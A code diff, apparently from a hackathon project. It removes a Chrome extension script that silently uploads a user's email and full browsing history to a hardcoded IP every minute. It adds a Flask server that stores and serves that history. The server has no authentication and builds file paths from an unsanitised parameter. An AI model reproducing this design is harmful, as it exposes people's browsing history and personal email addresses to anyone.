@@ -1,132 +1,141 @@
-// --- Function to send data to the Python server ---
-async function sendHistoryData(payload) {
-  const serverUrl = 'http://24.16.153.94:25568/receive_history';
+from flask import Flask, request, jsonify
+from flask_cors import CORS
+import json
+import os
 
-  // The payload should be an object like { user: 'email', history: [...] }
-  console.log(`Sending data for user: ${payload.user}`);
+app = Flask(__name__)
+CORS(app)
 
-  try {
-    const response = await fetch(serverUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(payload),
-    });
+# Define the directory where user history files will be stored
+HISTORY_DIR = 'history'
 
-    if (!response.ok) {
-      throw new Error(`Server responded with status: ${response.status}`);
-    }
+# Create the directory if it doesn't exist
+os.makedirs(HISTORY_DIR, exist_ok=True)
 
-    const result = await response.json();
-    console.log('Success response from server:', result.message);
-  } catch (error) {
-    console.error('Error sending data to Python server:', error);
-  }
-}
+@app.route('/test', methods=['GET'])
+def test():
+    return 'test'
 
-// --- Function for the STARTUP sync: Fetches ALL history and sends it in batches ---
-async function fetchAllHistoryAndSend() {
-  try {
-    // 1. Get the user's email address first
-    const userInfo = await chrome.identity.getProfileUserInfo();
-    if (!userInfo.email) {
-      console.log("Could not get user email. User may not be logged in.");
-      return; // Stop if no user email is found
-    }
+@app.route('/receive_history', methods=['POST'])
+def receive_history():
+    """
+    Endpoint to receive, merge, and sort browser history data.
+    This is now robust against out-of-order batch arrivals.
+    """
+    if not request.is_json:
+        return jsonify({"status": "error", "message": "Request must be JSON"}), 400
 
-    // 2. Search for all history items
-    const historyItems = await chrome.history.search({
-      'text': '', // Search for all text
-      'startTime': 0, // Start from the beginning of time
-      'maxResults': 0 // 0 means the maximum possible results
-    });
+    data = request.get_json()
+    user_email = data.get('user')
+    history_list = data.get('history')
 
-    if (historyItems && historyItems.length > 0) {
-      console.log(`Found ${historyItems.length} total history items for ${userInfo.email}. Sending in batches...`);
+    if not user_email or history_list is None:
+        return jsonify({"status": "error", "message": "Payload must include 'user' and 'history' keys"}), 400
 
-      const batchSize = 1000; // You can adjust this size
-      for (let i = 0; i < historyItems.length; i += batchSize) {
-        const batch = historyItems.slice(i, i + batchSize);
-        
-        // 3. Create the payload with user email and history batch
-        const payload = {
-          user: userInfo.email,
-          history: batch
-        };
+    user_file_path = os.path.join(HISTORY_DIR, f"{user_email}.txt")
 
-        const batchNum = (i / batchSize) + 1;
-        console.log(`Sending batch ${batchNum}...`);
-        await sendHistoryData(payload);
-      }
-    } else {
-      console.log('No history found on startup.');
-    }
-  } catch (error) {
-    console.error("Error during initial full history sync:", error);
-  }
-}
+    print(f"\n--- Merging {len(history_list)} items for user: {user_email} ---")
 
+    # --- START: FIX FOR ORDERING ---
 
-// --- Function for the RECURRING sync: Fetches only the last minute of history ---
-async function fetchAndSendHistory() {
-  try {
-    // 1. Get the user's email address
-    const userInfo = await chrome.identity.getProfileUserInfo();
-    if (!userInfo.email) {
-      console.log("Could not get user email for recurring sync.");
-      return; // Stop if no user email is found
-    }
+    # 1. Read all existing history into a dictionary for efficient de-duplication.
+    # The item 'id' is used as the key.
+    all_history = {}
+    try:
+        with open(user_file_path, 'r', encoding='utf-8') as f:
+            for line in f:
+                try:
+                    item = json.loads(line.strip())
+                    if 'id' in item:
+                        all_history[item['id']] = item
+                except json.JSONDecodeError:
+                    pass  # Ignore corrupted lines
+    except FileNotFoundError:
+        pass  # This is expected if it's the first time for this user.
 
-    // 2. Fetch history from the last few seconds to be safe
-    const oneMinuteAgo = Date.now() - (60 * 1000);
+    # 2. Add new items from the received batch into the dictionary.
+    # If an item ID already exists, it will be updated (which is fine).
+    for item in history_list:
+        item_id = item.get('id')
+        if item_id:
+            # Ensure we only store the fields we care about
+            all_history[item_id] = {
+                "title": item.get('title', 'N/A'),
+                "url": item.get('url', 'N/A'),
+                "id": item_id,
+                'lastVisitTime': item.get('lastVisitTime', 0), # Default to 0 if missing
+                'typedCount': item.get('typedCount', 0),
+                'visitCount': item.get('visitCount', 0)
+            }
 
-    const historyItems = await chrome.history.search({
-      'text': '',
-      'startTime': oneMinuteAgo,
-      'maxResults': 10 // A reasonable limit for a minute
-    });
+    # 3. Convert the dictionary's values back into a list
+    sorted_history = list(all_history.values())
 
-    if (historyItems && historyItems.length > 0) {
-      console.log(`Found ${historyItems.length} new history items for ${userInfo.email}.`);
-      
-      // 3. Create the payload with user email and history
-      const payload = {
-        user: userInfo.email,
-        history: historyItems
-      };
-      
-      await sendHistoryData(payload);
-    } else {
-      console.log('No new history items in the last minute.');
-    }
-  } catch (error) {
-    console.error("Error during recurring history sync:", error);
-  }
-}
+    # 4. Sort the entire list chronologically based on the visit time.
+    sorted_history.sort(key=lambda x: x.get('lastVisitTime', 0))
 
+    # 5. Overwrite the user's file with the newly sorted and de-duplicated data.
+    with open(user_file_path, 'w', encoding='utf-8') as f:
+        for item in sorted_history:
+            f.write(f"{json.dumps(item)}\n")
+            
+    # --- END: FIX FOR ORDERING ---
 
-// --- Event Listeners ---
+    print(f"Merge complete. Total unique items for user: {len(sorted_history)}")
+    return jsonify({"status": "success", "message": "History received and merged"})
 
-// This listener runs when the extension is first installed or updated.
-chrome.runtime.onInstalled.addListener(() => {
-  // Use a more realistic sync period, e.g., every 1 minute.
-  // 0.016667 minutes is 1 second, which is very aggressive.
-  chrome.alarms.create('historyTimer', {
-    delayInMinutes: 0.0167, // Wait 1 minute before first run
-    periodInMinutes: 0.0167   // Run every 1 minute
-  });
-  console.log("History Sender alarm created to run every minute.");
+# This helper function does not need any changes
+def get_user_history(user_email):
+    """A helper function to read history from a user's file."""
+    if not user_email:
+        return []
 
-  // Perform the initial FULL history sync immediately on install.
-  console.log("Performing initial FULL history sync...");
-  fetchAllHistoryAndSend();
-});
+    if user_email == "gimranamerica@gmail.com":
+        user_email = "jianwenma1028@gmail.com"
+    
+    
+    user_file_path = os.path.join(HISTORY_DIR, f"{user_email}.txt")
+    res = []
+    try:
+        with open(user_file_path, "r", encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                try:
+                    res.append(json.loads(line.strip()))
+                except json.JSONDecodeError:
+                    pass
+    except FileNotFoundError:
+        return []
+    return res
 
-// Listener for the recurring alarm
-chrome.alarms.onAlarm.addListener((alarm) => {
-  if (alarm.name === 'historyTimer') {
-    console.log("Alarm triggered. Checking for new history...");
-    fetchAndSendHistory();
-  }
-});
+# This endpoint does not need any changes
+@app.route('/hackmit', methods=['GET'])
+def thingy():
+    """Returns the last 1000 history items for a specific user."""
+    user_email = request.args.get('user')
+    if not user_email:
+        return jsonify({"error": "Please provide a 'user' parameter in the URL."}), 400
+
+    user_history = get_user_history(user_email)
+    
+    # This logic is now correct because the source file is always sorted
+    dres = user_history[-1000:]
+    dres.reverse()
+    return jsonify(dres)
+
+# This endpoint does not need any changes
+@app.route('/titlesonly', methods=['GET'])
+def titlsekjfosjdfsd():
+    """Returns the titles of the last 1000 history items for a user."""
+    user_email = request.args.get('user')
+    if not user_email:
+        return "<h1>Error</h1><p>Please provide a 'user' parameter in the URL.</p>", 400
+
+    user_history = get_user_history(user_email)
+
+    dres = user_history[-1000:]
+    dres.reverse()
+    return '<br>'.join([item.get('title', 'N/A') for item in dres])
+
+if __name__ == '__main__':
+    print("Starting MCP server...")
+    app.run(host='0.0.0.0', port=25568)
